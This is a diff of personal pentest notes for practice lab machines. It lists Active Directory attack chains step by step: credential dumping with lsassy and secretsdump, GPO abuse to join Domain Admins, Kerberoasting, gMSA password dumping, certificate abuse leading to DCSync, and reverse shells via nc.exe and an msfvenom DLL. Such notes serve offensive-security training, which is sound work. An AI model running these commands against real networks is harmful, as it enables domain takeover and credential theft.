@@ -1,22 +1,23 @@
 
 #### Secura => Lsassy, MySQL, WriteOwner + GPLink 
 1. On M1 user is admin, run `nxc smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -M lsassy` 
-2. On M2 `mysqldump.exe -u root --all-databases > dump.sql` 
-3. On M2 `Get-DomainGPO -Identity "Default Domain Policy" | Select-Object name, displayname` 
-4. On M3 `Set-DomainObjectOwner -Identity "31B2F340-016D-11D2-945F-00C04FB984F9" -OwnerIdentity charlotte` 
-5. On M3 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All` 
-6. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip 192.168.131.97 -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:Game2On4.!'` 
-7. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:Game2On4.!@192.168.131.97'` 
+2. On M2 `mysqldump.exe -u root --all-databases > dump.sql`, bloodhound shows GPO abuse 
+3. On M2 `$Pass = ConvertTo-SecureString 'Game2On4.!' -AsPlainText -Force` then `$Cred = New-Object System.Management.Automation.PSCredential('secura.yzx\charlotte', $Pass)` then `Import-Module .\PowerView.ps1` 
+4. On M2 `Get-DomainGPO -Domain secura.yzx -Server 192.168.92.97 -Credential $Cred -Identity 'Default Domain Policy' | Select-Object name, displayname` 
+5. On M2 `Set-DomainObjectOwner -Identity "31B2F340-016D-11D2-945F-00C04FB984F9" -OwnerIdentity charlotte -Server 192.168.92.97 -Credential $Cred` 
+6. On M2 `Add-DomainObjectAcl -TargetIdentity "31B2F340-016D-11D2-945F-00C04FB984F9" -PrincipalIdentity charlotte -Rights All -Server 192.168.92.97 -Credential $Cred` 
+7. On kali `python3 pygpoabuse.py -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -dc-ip {{DC_IP}} -command "net group \"Domain Admins\" charlotte /add /domain" 'secura.yzx/charlotte:Game2On4.!'` 
+8. On M3 `gpupdate /force` then kali `impacket-secretsdump 'secura.yzx/charlotte:Game2On4.!@{{DC_IP}}'` 
 
 ==== 
 
 #### Access => Kerberoasting, SeManageVolumePrivilege 
-1. Use Get-SPNs.ps1 then `Add-Type -AssemblyName System.IdentityModel` then `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'` to store token in memory 
-2. Run Invoke-Kerberoast.ps1 to grab the hash then `Invoke-RunasCs -Username {{USERNAME}} -Password {{PASSWORD}} -Command "whoami"` (Invoke-RunasCs needs importing) 
+1. Import PowerView, `Get-netuser svc_mssql`, user has SPN = `./Rubeus.exe kerberoast /nowrap` (alternatively store token in memory) 
+2. Import RunasCs, then `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe {{LHOST}} 4444 -e cmd.exe'` 
 
-#### Heist => Group can dump password 
-1. Responder only works with HTTP On and 'http://{{LHOST}}' 
-2. Run ` Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword ` to check, then `Import-Module .\GMSAPassword.ps1` to dump 
+#### Heist => Group user can dump password 
+1. Run responder with HTTP & 'http://{{LHOST}}', in todo.txt 'enox' is handing web admin to 'svc_apache$' so might have power over this svc acc = import ActiveDirectory then `Get-ADPrincipalGroupMembership svc_apache$` 
+2. Run `Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword` to check, then `Import-Module .\GMSAPassword.ps1` to dump (or alternatively `GMSAPasswordReader.exe --accountname svc_apache`) 
 
 #### Hutch => DAV 
 1. Do ldapsearch + descriptions to get creds, then use `cadaver` to upload aspx, rev shell, potato into dav.  
@@ -26,7 +27,7 @@
 1. Make users list from website, guess some passwords (eg Summer2023, Nagoya2023) and spray 
 2. In rpcclient, 'fiona' changes pw for 'svc_helpdesk', 'svc_helpdesk' changes pw for 'christopher'. 
 3. Run `Import-Module ActiveDirectory` then `Get-ADDomain` then `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` to get sid 
-4. Kerberoast to get svc_mssql, run chisel = https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f 
+4. Kerberoast to get svc_mssql (can also be done with dumped creds & impacket), run chisel = https://medium.com/@mu.aktepe18/nagoya-proving-ground-walk-through-afb50d51bb0f 
 
 #### Resourced => RBCD 
 1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
@@ -76,4 +77,9 @@ SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUj
 3. User is in DnsAdmins group = use dnscmd.exe to inject msfvenom DLL 
 4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=443 -f dll -o rev.dll` 
 
-
+#### Scepter => 
+Walkthrough = https://0xdf.gitlab.io/2025/07/19/htb-scepter.html 
+1. Crack pfx & pem with john, use pem creds to gen pfx to get 1st user hash & tgt 
+2. Check **outbound** control, change 2nd user pw 
+3. Change 1st user altSecurityIdentities to same as 3rd user, request StaffAccessCertificate as 3rd user (2nd user has GenericAll over StaffAccessCertificate, so use bloodyAD to give full control) 
+4. Use 3rd user to set altSecurityIdentities for 4th user and repeat [3]; 4th user can DCsync. 
